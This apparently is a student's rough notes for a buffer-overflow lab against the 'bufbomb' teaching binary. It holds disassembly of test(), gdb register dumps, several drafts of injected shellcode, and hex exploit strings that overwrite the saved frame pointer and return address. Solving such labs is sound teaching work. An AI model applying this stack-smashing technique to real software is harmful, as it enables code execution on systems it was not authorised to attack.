@@ -1,0 +1,178 @@
+08048be0 <test>:
+ 8048be0:       55                      push   %ebp
+ 8048be1:       89 e5                   mov    %esp,%ebp
+ 8048be3:       83 ec 28                sub    $0x28,%esp
+ 8048be6:       e8 38 04 00 00          call   8049023 <uniqueval>
+ 8048beb:       89 45 f0                mov    %eax,-0x10(%ebp)
+ 8048bee:       e8 91 06 00 00          call   8049284 <getbuf>
+
+
+ 8048bf3:       89 45 f4                mov    %eax,-0xc(%ebp)
+ 8048bf6:       e8 28 04 00 00          call   8049023 <uniqueval>
+ 8048bfb:       8b 55 f0                mov    -0x10(%ebp),%edx
+ 8048bfe:       39 d0                   cmp    %edx,%eax
+ 8048c00:       74 0e                   je     8048c10 <test+0x30>
+ 8048c02:       c7 04 24 50 a6 04 08    movl   $0x804a650,(%esp)
+ 8048c09:       e8 f2 fc ff ff          call   8048900 <puts@plt>
+ 8048c0e:       eb 42                   jmp    8048c52 <test+0x72>
+ 8048c10:       8b 55 f4                mov    -0xc(%ebp),%edx
+ 8048c13:       a1 04 e1 04 08          mov    0x804e104,%eax
+ 8048c18:       39 c2                   cmp    %eax,%edx
+ 8048c1a:       75 22                   jne    8048c3e <test+0x5e>
+ 8048c1c:       b8 79 a6 04 08          mov    $0x804a679,%eax
+ 8048c21:       8b 55 f4                mov    -0xc(%ebp),%edx
+ 8048c24:       89 54 24 04             mov    %edx,0x4(%esp)
+ 8048c28:       89 04 24                mov    %eax,(%esp)
+ 8048c2b:       e8 00 fc ff ff          call   8048830 <printf@plt>
+ 8048c30:       c7 04 24 03 00 00 00    movl   $0x3,(%esp)
+ 8048c37:       e8 f2 07 00 00          call   804942e <validate>
+ 8048c3c:       eb 14                   jmp    8048c52 <test+0x72>
+ 8048c3e:       b8 96 a6 04 08          mov    $0x804a696,%eax
+ 8048c43:       8b 55 f4                mov    -0xc(%ebp),%edx
+ 8048c46:       89 54 24 04             mov    %edx,0x4(%esp)
+ 8048c4a:       89 04 24                mov    %eax,(%esp)
+ 8048c4d:       e8 de fb ff ff          call   8048830 <printf@plt>
+ 8048c52:       c9                      leave
+ 8048c53:       c3                      ret
+
+
+ mov  $0x5aad556c,%eax
+ push $0x08048bf3
+ ret 
+
+ ebp            0x55683940
+
+ eax            0x55683918
+
+ (gdb) p/x $ebp
+$1 = 0x55683970
+
+ 
+ 
+00000000 <.text>:
+   0:	b8 6c 55 ad 5a       	mov    $0x5aad556c,%eax  //将cookie作为返回值
+   5:	68 f3 8b 04 08       	push   $0x8048bf3  //回到test
+   a:	c3                   	ret 
+                                                            
+b8 6c 55 ad 5a 68 f3 8b 04 08 
+c3 00 00 00 00 00 00 00 00 00
+00 00 00 00 00 00 00 00 00 00
+00 00 00 00 00 00 00 00 00 00
+40 39 68 55 18 39 58 55
+
+
+b8 6c 55 ad 5a 68 f3 8b 
+04 08 c3 00 00 00 00 00 
+00 00 00 00 00 00 00 00 
+00 00 00 00 00 00 00 00 
+00 00 00 00 00 00 00 00 
+40 39 68 55 18 39 58 55
+
+eax            0xc      12
+ecx            0x0      0
+edx            0xf7fbf870       -134481808
+ebx            0x0      0
+esp            0x55683948       0x55683948 <_reserved+1038664>
+ebp            0x55683970       0x55683970 <_reserved+1038704>
+esi            0x3      3
+edi            0xf7fbe000       -134488064
+eip            0x8048be6        0x8048be6 <test+6>
+eflags         0x216    [ PF AF IF ]
+cs             0x23     35
+ss             0x2b     43
+ds             0x2b     43
+es             0x2b     43
+fs             0x0      0
+gs             0x63     99
+k0             0x0      0
+k1             0x0      0
+k2             0x0      0
+k3             0x0      0
+k4             0x0      0
+k5             0x0      0
+
+00000000 <.text>:
+   0:	b8 6c 55 ad 5a       	mov    $0x5aad556c,%eax
+   5:	bd 70 39 68 55       	mov    $0x55683970,%ebp
+   a:	68 e6 8b 04 08       	push   $0x8048be6
+   f:	c3 
+
+b8 6c 55 ad 5a bd 70 39 68 55 
+68 e6 8b 04 08 c3 00 00 00 00
+00 00 00 00 00 00 00 00 00 00
+00 00 00 00 00 00 00 00 00 00
+00 00 00 00 18 39 68 55
+
+
+b8 6c 55 ad 5a bd 70 39 68 55
+68 e6 8b 04 08 c3 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 18 39 68 55
+
+
+ebp            0x55683940
+
+00000000 <.text>:
+   0:	b8 6c 55 ad 5a       	mov    $0x5aad556c,%eax
+   5:	bd 40 39 68 55       	mov    $0x55683940,%ebp
+   a:	68 e6 8b 04 08       	push   $0x8048be6
+   f:	c3                   	ret    
+jeremyhua@jeremy-vm:~/Desktop/tmp/2$ 
+
+00000000 <.text>:
+   0:	b8 6c 55 ad 5a       	mov    $0x5aad556c,%eax
+   5:	bd 40 39 68 55       	mov    $0x55683940,%ebp
+   a:	68 f3 8b 04 08       	push   $0x8048bf3
+   f:	c3                   	ret 
+
+b8 6c 55 ad 5a bd 40 39 68 55
+68 f3 8b 04 08 c3 00 00 00 00
+00 00 00 00 00 00 00 00 00 00 
+00 00 00 00 00 00 00 00 00 00
+00 00 00 00 18 39 68 55
+
+b8 6c 55 ad 5a bd 40 39 68 55 68 f3 8b 04 08 c3 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 18 39 68 55
+
+
+        b8 6c 55 ad 5a       	mov    $0x5aad556c,%eax
+   5:	68 f3 8b 04 08       	push   $0x8048bf3
+   a:	c3                   	ret
+
+b8 6c 55 ad 5a 68 f3 8b 04 08 
+c3 00 00 00 00 00 00 00 00 00
+00 00 00 00 00 00 00 00 00 00
+00 00 00 00 00 00 00 00 00 00 
+
+(gdb) b test
+Breakpoint 1 at 0x8048be6
+(gdb) r -u 2019300003032
+Starting program: /data/workspace/myshixun/overflow4/bufbomb -u 2019300003032
+Userid: 2019300003032
+Cookie: 0x5aad556c
+
+Breakpoint 1, 0x08048be6 in test ()
+(gdb) p/x $ebp
+$1 = 0x55683970
+(gdb) 
+
+b8 6c 55 ad 5a 68 f3 8b 04 08 c3 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 70 39 68 55 18 39 68 55
+
+(gdb) b test
+Breakpoint 1 at 0x8048be6
+(gdb) r -u 2016010305
+Starting program: /data/workspace/myshixun/overflow4/bufbomb -u 2016010305
+Userid: 2016010305
+Cookie: 0x3d91b195
+
+Breakpoint 1, 0x08048be6 in test ()
+(gdb) p/x $ebp
+$1 = 0x55683c00
+(gdb) 
+
+
+0000000 <.text>:
+   0:	b8 95 b1 91 3d       	mov    $0x3d91b195,%eax
+   5:	68 f3 8b 04 08       	push   $0x8048bf3                            55683c00 
+   a:	c3                   	ret
+
+b8 95 b1 91 3d 68 f3 8b 04 08    c3 00 00 00 00 00 00 00 00 00    00 00 00 00 00 00 00 00 00 00   00 00 00 00 00 00 00 00 00 00   00 3c 68 55  18 39 68 55
+
+ebp            0x 55 68 3c 00
